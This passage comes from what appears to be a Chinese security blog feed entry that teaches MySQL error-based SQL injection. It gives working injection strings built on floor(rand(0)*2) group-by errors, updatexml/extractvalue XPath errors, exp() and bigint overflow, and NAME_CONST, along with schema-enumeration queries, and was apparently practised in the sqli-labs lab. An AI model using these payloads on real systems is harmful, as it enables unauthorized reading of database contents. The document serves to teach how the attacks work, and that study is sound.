src="http://i2.muimg.com/567571/348312529bf357fb.png" alt=""></p><p>这里只用user()来做实例，其他爆表，爆字段直接代替user()就行了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id=1&apos; union select 1,count(*),concat(0x3a,0x3a,user(),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+</div></pre></td></tr></table></figure><p>可以简化成这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id=1&apos; and  (select count(*) from information_schema.tables group by concat(0x3a,0x3a,version(),0x3a,0x3a,floor(rand(0)*2))) --+</div></pre></td></tr></table></figure><p>也可以改成这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id=1&apos; and  (select 1 from (select count(*),(concat(0x3a,user(),0x3a,floor(rand()*2)))name from information_schema.tables group by name)b --+</div></pre></td></tr></table></figure><p>语句分解：</p><blockquote><p>(select 1 from b) //在b上做派生表<br>b=select count(_),name from information_schema.tables group by name //从information_schema里面选取那么的内容和计数的内容<br>name=concat(0x3a,(查询内容),0x3a,floor(rand()_2)) //把:和查询内容，还有随机取整数 连接在一起</p></blockquote><p>具体为什么count(_),floor(rand(0)_2) group by 会报错，必须说这三个元素必须全部放在一个语句里才能报错。<br><a href="http://mp.weixin.qq.com/s__biz=MzA5NDY0OTQ0Mw==&amp;mid=403404979&amp;idx=1&amp;sn=27d10b6da357d72304086311cefd573e&amp;scene=1&amp;srcid=04131X3lQlrDMYOCntCqWf6n#wechat_redirect" target="_blank" rel="external">http://mp.weixin.qq.com/s__biz=MzA5NDY0OTQ0Mw==&amp;mid=403404979&amp;idx=1&amp;sn=27d10b6da357d72304086311cefd573e&amp;scene=1&amp;srcid=04131X3lQlrDMYOCntCqWf6n#wechat_redirect</a></p><ul><li>解释下 select 1 from table</li></ul><p>它的作用就是 增加临时列，每行的列值是写在select后的数，这条sql语句中是1<br><img src="http://i2.muimg.com/567571/e60e90caa6f03d2d.png" alt=""></p><ul><li>rand(0) rand(1)和rand()的区别</li></ul><p><img src="http://i2.muimg.com/567571/29a88425dd842351.png" alt=""></p><p>rand()会随机报错，就是有可能报错，有的时候不会，rand(0)肯定会报错，rand(1)则一定不会报错。<br>所以要让他报错的话直接用rand(0)</p><h3 id="00x2-xpath函数"><a href="#00x2-xpath函数" class="headerlink" title="00x2 xpath函数"></a>00x2 xpath函数</h3><p>如果细究这个会浪费很多时间，而且我目前没怎么接触过XML，所以就简略地介绍下这个函数的用法了。<br>想了解的可以多搜索一些关于xpath注入，这也是sql注入的额一种趋势吧。</p><ul><li>updatexml()  最多爆出32位的</li></ul><p>函数原型：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">updatexml(xml_target, xpath_expr, new_xml)</div></pre></td></tr></table></figure></p><p>第一个参数是目标xml，第二个参数是xpath表达式，第三个参数替换目标xml的新的xml。注入中只关心第二个参数就够了。（XPath 是一门在 XML（可扩展标记语言）文档中查找信息的语言。）</p><p>用法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">updatexml(1,concat(0x3a,(查询内容),0x3a),1)</div></pre></td></tr></table></figure></p><p>在MySQL控制台里面实测下</p><p><img src="http://i2.muimg.com/567571/1d69376a029682e1.png" alt=""></p><ul><li>extractvalue()  最多爆出32位的</li></ul><p>extractvalue方式与updatexml类似，只是extractvalue()中少了第三个参数</p><p>用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">extractvalue(1, concat(0x3a, (查询内容),0x3a))</div></pre></td></tr></table></figure><p>在MySQL里实测下<br><img src="http://i2.muimg.com/567571/11177c1b1910f075.png" alt="">  </p><p>注意几点，语句出错，想了半天没想明白怎么回事。是union语句连接2个语句的时候，2条语句所在的表形式不同所以返回不了。<br><img src="http://ww4.sinaimg.cn/large/006HJ39wgy1fffdiqh36vj318u0dkajc.jpg" alt=""><br><img src="http://ww4.sinaimg.cn/large/006HJ39wgy1fffdk4awm6j31830dbk0l.jpg" alt=""></p><h3 id="00x3-值类型超出范围导致报错"><a href="#00x3-值类型超出范围导致报错" class="headerlink" title="00x3 值类型超出范围导致报错"></a>00x3 值类型超出范围导致报错</h3><p>在MySQL版本大于等于5.5.5的的时候才能用户</p><ul><li>double型函数exp()超出范围</li></ul><p>这个函数为以e为底的对数函数</p><p>用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select exp(~(select*from(select user())x))</div></pre></td></tr></table></figure><p>报错具体原理<a href="http://www.cnblogs.com/lcamry/articles/5509124.html" target="_blank" rel="external">http://www.cnblogs.com/lcamry/articles/5509124.html</a></p><p><img src="http://i2.muimg.com/567571/677277689e425d96.png" alt=""></p><ul><li>bigint超出范围</li></ul><p>具体原理<a href="http://www.cnblogs.com/lcamry/articles/5509112.html" target="_blank" rel="external">http://www.cnblogs.com/lcamry/articles/5509112.html</a><br>跟上面的差不多。</p><h3 id="00x4-利用数据重复性"><a href="#00x4-利用数据重复性" class="headerlink" title="00x4 利用数据重复性"></a>00x4 利用数据重复性</h3><p>用法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x</div></pre></td></tr></table></figure></p><p>这里的version(0出现了2次，所以报错。</p><p><img src="http://i2.muimg.com/567571/2c3a0b9bb9b9b544.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;参考资料：&quot;&gt;&lt;a href=&quot;#参考资料：&quot; class=&quot;headerlink&quot; title=&quot;参考资料：&quot;&gt;&lt;/a&gt;参考资料：&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://www.waitalone.cn/mysql-error-based-injection.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.waitalone.cn/mysql-error-based-injection.html&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://www.111cn.net/database/mysql/47680.htm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.111cn.net/database/mysql/47680.htm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;一些基本的查基本信息的语句：&lt;/p&gt;
&lt;p&gt;查库 (select schema_name from information_schema.schemata limit m,n)&lt;/p&gt;
&lt;p&gt;查表 (select table_name from information_schema.columns where table_schema=’whc’ limit 0,1)&lt;/p&gt;
&lt;p&gt;查字段 (select column_name from information_schema.columns where table_schema=’whc’ limit 0,1)&lt;/p&gt;
&lt;p&gt;加上limit 是因为sqllab里面限制了回显的个数，实战里面应该用不到。&lt;br&gt;
    
    </summary>
    
      <category term="漏洞" scheme="http://whc.dropsec.xyz/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="SQL注入" scheme="http://whc.dropsec.xyz/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
</feed>
